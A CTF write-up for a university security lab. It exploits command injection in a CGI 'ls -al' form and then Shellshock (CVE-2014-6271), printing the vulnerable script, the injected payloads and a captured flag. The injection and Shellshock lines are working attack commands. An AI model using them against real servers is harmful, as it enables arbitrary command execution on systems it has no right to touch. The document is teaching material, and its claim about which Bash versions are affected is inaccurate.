# Environment Variables: CTF #4

## Recognition

- The web server presents a form that executes `ls -al <input>` when submitted, being `<input>` the value of the form field.
- The form is vulnerable to command injection, i.e, when submitting `. && env`, the environment variables are displayed:

  ```
  SERVER_SIGNATURE=
  Apache/2.4.7 (Ubuntu) Server at ctf-fsi.fe.up.pt Port 5002


  UNIQUE_ID=[REDACTED]
  HTTP_USER_AGENT=Mozilla/5.0 (X11; Linux x86_64; rv:131.0) Gecko/20100101 Firefox/131.0
  HTTP_HOST=ctf-fsi.fe.up.pt:5002
  SERVER_PORT=5002
  DOCUMENT_ROOT=/var/www/html
  SCRIPT_FILENAME=/usr/lib/cgi-bin/list.cgi
  REQUEST_URI=/cgi-bin/list.cgi?path=.+%26%26+env
  SCRIPT_NAME=/cgi-bin/list.cgi
  HTTP_CONNECTION=keep-alive
  REMOTE_PORT=[REDACTED]
  PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
  path=. && env
  _=/usr/bin/env
  CONTEXT_PREFIX=/cgi-bin/
  SERVER_ADMIN=webmaster@localhost
  PWD=/usr/lib/cgi-bin
  REQUEST_SCHEME=http
  HTTP_ACCEPT_LANGUAGE=en-US,en;q=0.5
  HTTP_REFERER=http://ctf-fsi.fe.up.pt:5002/
  HTTP_ACCEPT=text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
  HTTP_DNT=1
  HTTP_PRIORITY=u=0, i
  REMOTE_ADDR=[REDACTED]
  SERVER_NAME=ctf-fsi.fe.up.pt
  SHLVL=2
  SERVER_SOFTWARE=Apache/2.4.7 (Ubuntu)
  QUERY_STRING=path=.+%26%26+env
  SERVER_ADDR=10.146.3.2
  GATEWAY_INTERFACE=CGI/1.1
  HTTP_UPGRADE_INSECURE_REQUESTS=1
  SERVER_PROTOCOL=HTTP/1.1
  HTTP_ACCEPT_ENCODING=gzip, deflate
  HTTP_SEC_GPC=1
  REQUEST_METHOD=GET
  CONTEXT_DOCUMENT_ROOT=/usr/lib/cgi-bin/
  X=.
  ```

  > Note: Some values were redacted from the output because they refer to the client, and thus are not relevant for this analysis.

- The main page includes a list of packages installed on the server, including:

  - apache2/trusty-updates,trusty-security,now 2.4.7-1ubuntu4.22 amd64 [installed]
  - bash/trusty-updates,trusty-security,now 4.3-7ubuntu1.7 amd64 [installed]
  - dash/trusty,now 0.5.7-4ubuntu1 amd64 [installed]
  - sudo/trusty-updates,trusty-security,now 1.8.9p5-1ubuntu1.4 amd64 [installed]
  - ubuntu-minimal/trusty-updates,now 1.325.1 amd64 [installed]

- The path where the `ls` commands are executed is `/usr/lib/cgi-bin`.
  It is worth noting that in the environment variables, there were a lot of references to `cgi-bin`.

- The `/home` directory is empty.

- There is a `flag.txt` file in `/var/flag/flag.txt` with the permissions:

  ```bash
  -rw-r--r-- 1 root root 37 Oct 15 22:45 /var/flag/flag.txt
  ```

- The server does not give any output when trying to execute `cat` command.

  > Despite this, it is possible to access the contents of the file by using the `less` command.  
  > There were found various files (`/tmp/myflag.txt`, `/usr/lib/cgi-bin/logo.cgi`, `/var/flag/flag.txt`) with references to this message:
  >
  > ```
  > "/usr/local/bin/bash" may be a binary file.  See it anyway?
  > ```
  >
  > More specifically, the `flag.txt` file also contains the flag `flag{nepRv5p2brjkL7c7Z4l3tMMq6T1mgO}`, which is the solution at the time of writing. Note that the flag changes periodically.
  > We suspect that the use of `less` was not intended for this CTF.
  >
  > Also, the `less` command gives access to the code inside `/usr/lib/cgi-bin/list.cgi`:
  >
  > ```bash
  > #!/bin/bash
  > echo "Content-type: text/html"
  > echo ""
  > echo "
  >
  > "
  > #echo $QUERY_STRING
  >
  > # (internal) routine to decode urlencoded strings
  > function cgi_decodevar()
  > {
  >     [ $# -ne 1 ] && return
  >     local v t h
  >     # replace all + with whitespace and append %%
  >     t="${1//+/ }%%"
  >     while [ ${#t} -gt 0 -a "${t}" != "%" ]; do
  >         v="${v}${t%%\%*}" # digest up to the first %
  >         t="${t#*%}"       # remove digested part
  >         # decode if there is anything to decode and if not at end of string
  >         if [ ${#t} -gt 0 -a "${t}" != "%" ]; then
  >             h=${t:0:2} # save first two chars
  >             t="${t:2}" # remove these
  >             v="${v}"`echo -e \\\\x${h}` # convert hex to special char
  >         fi
  >     done
  >     # return decoded string
  >     echo "${v}"
  >     return
  > }
  >
  > # routine to get variables from http requests
  > # usage: cgi_getvars method varname1 [.. varnameN]
  > # method is either GET or POST or BOTH
  > # the magic varible name ALL gets everything
  > function cgi_getvars()
  > {
  >     [ $# -lt 2 ] && return
  >     local q p k v s
  >     # get query
  >     case $1 in
  >         GET)
  >             [ ! -z "${QUERY_STRING}" ] && q="${QUERY_STRING}&"
  >             ;;
  >         POST)
  >             cgi_get_POST_vars
  >             [ ! -z "${QUERY_STRING_POST}" ] && q="${QUERY_STRING_POST}&"
  >             ;;
  >         BOTH)
  >             [ ! -z "${QUERY_STRING}" ] && q="${QUERY_STRING}&"
  >             cgi_get_POST_vars
  >             [ ! -z "${QUERY_STRING_POST}" ] && q="${q}${QUERY_STRING_POST}&"
  >             ;;
  >     esac
  >     shift
  >     s=" $* "
  >     # parse the query data
  >     while [ ! -z "$q" ]; do
  >         p="${q%%&*}"  # get first part of query string
  >         k="${p%%=*}"  # get the key (variable name) from it
  >         v="${p#*=}"   # get the value from it
  >         q="${q#$p&*}" # strip first part from query string
  >         # decode and assign variable if requested
  >         [ "$1" = "ALL" -o "${s/ $k /}" != "$s" ] && \
  >             export "$k"="`cgi_decodevar \"$v\"`"
  >     done
  >     return
  > }
  >
  > cgi_getvars GET ALL
  >
  > #echo $path
  >
  > /usr/local/bin/bash -c "env X=$path /usr/local/bin/bash -c \"echo 'ls -al $path' && ls -al $path\""
  >
  > #eval "env dir=$path /bin/bash -c echo 'test'"
  > #dir='() { :;}; echo vulnerable'
  > #echo "Listing ${dir}"
  >
  > #env X=eval $path /usr/local/bin/bash -c "echo test"
  >
  >
  > echo "
  >
  > ""/usr/local/bin/bash" may be a binary file.  See it anyway?
  > ```

## Vulnerability

- The linux machine has the exploit **CVE-2014-6271**, also known as "Shellshock", related to bash and cgi-bin.
- In versions prior to 4.3, GNU Bash processes trailing strings after function definitions inside environment variables [1].
- These environments variables can be modified by the attacker, since they are sent by the web server to the bash shell [3].
- This allows arbitrary command execution and bypass of environment restrictions to execute shell commands [2].

## Exploit

- The exploit [3] consists in setting an environment variable with a shell function inside and the code to be executed after it, like this:
  ```bash
  env 'VAR=() { :;}; <arbitrary code>'
  ```
- For example, if a system is vulnerable, this command will print `Bash is vulnerable!` [3]:
  ```bash
  env 'VAR=() { :;}; echo Bash is vulnerable!' 'FUNCTION()=() { :;}; echo Bash is vulnerable!' bash -c "echo Bash Test"
  ```

## Vulnerability exploration

To obtain the flag, just submit this code to the main form:

```bash
. && env 'VAR=() { :;}; cat /var/flag/flag.txt'
```

```
[...]
flag{nepRv5p2brjkL7c7Z4l3tMMq6T1mgO}
```

The path and the bash function can be different from this example.

---

#### References:

- [1] https://nvd.nist.gov/vuln/detail/cve-2014-6271
- [2] https://access.redhat.com/security/cve/cve-2014-6271
- [3] https://github.com/opsxcq/exploit-CVE-2014-6271
